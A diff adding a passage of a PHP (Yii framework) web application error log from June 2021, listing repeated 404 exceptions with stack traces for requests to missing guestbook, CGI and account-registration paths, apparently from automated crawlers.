@@ -1,0 +1,1670 @@
+2021/06/17 20:12:39 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "default.asp". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('default.asp')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/default.asp
+2021/06/17 20:12:39 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "default.asp". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('default.asp')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/default.asp
+2021/06/17 20:12:39 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "default.asp". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('default.asp')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/default.asp
+2021/06/17 20:12:40 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "album.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('album.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/album.cgi
+2021/06/17 20:12:41 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "album.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('album.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/album.cgi
+2021/06/17 20:12:41 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "album.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('album.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/album.cgi
+2021/06/17 20:12:41 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "album.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('album.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/album.cgi
+2021/06/17 20:12:41 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "album.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('album.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/album.cgi
+2021/06/17 20:12:42 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "album.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('album.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/album.cgi
+2021/06/17 20:12:43 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:12:43 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:12:44 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:12:44 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:12:45 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:12:45 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.php
+2021/06/17 20:12:46 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "scarbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('scarbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/scarbook.php
+2021/06/17 20:12:46 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "scarbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('scarbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/scarbook.php
+2021/06/17 20:12:46 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "scarbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('scarbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/scarbook.php
+2021/06/17 20:12:46 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "scarbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('scarbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/scarbook.php
+2021/06/17 20:12:47 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "scarbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('scarbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/scarbook.php
+2021/06/17 20:12:47 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "scarbook.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('scarbook.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/scarbook.php
+2021/06/17 20:12:48 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.html". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.html')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.html
+2021/06/17 20:12:48 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.html". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.html')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.html
+2021/06/17 20:12:49 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.html". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.html')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.html
+2021/06/17 20:12:49 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.html". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.html')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.html
+2021/06/17 20:12:50 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.html". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.html')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.html
+2021/06/17 20:12:51 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "guestbook.html". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('guestbook.html')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/guestbook.html
+2021/06/17 20:12:52 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gaestebuch.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gaestebuch.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gaestebuch.php
+2021/06/17 20:12:53 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gaestebuch.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gaestebuch.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gaestebuch.php
+2021/06/17 20:12:53 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gaestebuch.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gaestebuch.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gaestebuch.php
+2021/06/17 20:12:54 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gaestebuch.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gaestebuch.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gaestebuch.php
+2021/06/17 20:12:54 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gaestebuch.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gaestebuch.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gaestebuch.php
+2021/06/17 20:12:54 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gaestebuch.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gaestebuch.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gaestebuch.php
+2021/06/17 20:12:54 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "apps/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('apps/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/apps/guestbook
+2021/06/17 20:12:54 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "apps/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('apps/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/apps/guestbook
+2021/06/17 20:12:55 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "apps/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('apps/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/apps/guestbook
+2021/06/17 20:12:55 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "apps/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('apps/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/apps/guestbook
+2021/06/17 20:12:55 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "apps/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('apps/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/apps/guestbook
+2021/06/17 20:12:55 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "apps/guestbook". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('apps/guestbook')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/apps/guestbook
+2021/06/17 20:12:55 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "g_book.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('g_book.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/g_book.cgi
+2021/06/17 20:12:56 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "g_book.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('g_book.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/g_book.cgi
+2021/06/17 20:12:56 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "g_book.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('g_book.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/g_book.cgi
+2021/06/17 20:12:56 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "g_book.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('g_book.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/g_book.cgi
+2021/06/17 20:12:56 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "g_book.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('g_book.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/g_book.cgi
+2021/06/17 20:12:57 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "g_book.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('g_book.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/g_book.cgi
+2021/06/17 20:12:57 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gb.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gb.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gb.php
+2021/06/17 20:12:57 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gb.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gb.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gb.php
+2021/06/17 20:12:57 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gb.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gb.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gb.php
+2021/06/17 20:12:57 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gb.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gb.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gb.php
+2021/06/17 20:12:58 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gb.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gb.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gb.php
+2021/06/17 20:12:58 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gb.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gb.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gb.php
+2021/06/17 20:37:54 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "component/users". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('component/users')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/index.php/component/users/?view=registration
+2021/06/17 20:37:54 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "component/users". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('component/users')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/index.php/component/users/?view=registration
+2021/06/17 20:37:54 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "component/users". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('component/users')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/index.php/component/users/?view=registration
+2021/06/17 20:37:54 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "component/users". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('component/users')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/index.php/component/users/?view=registration
+2021/06/17 20:37:55 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "component/users". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('component/users')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/index.php/component/users/?view=registration
+2021/06/17 20:37:55 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "component/users". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('component/users')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/index.php/component/users/?view=registration
+2021/06/17 20:37:56 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "modules.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('modules.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/modules.php?name=Your_Account
+2021/06/17 20:37:56 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "modules.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('modules.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/modules.php?name=Your_Account
+2021/06/17 20:37:56 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "modules.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('modules.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/modules.php?name=Your_Account
+2021/06/17 20:37:56 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "modules.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('modules.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/modules.php?name=Your_Account
+2021/06/17 20:37:57 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "modules.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('modules.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
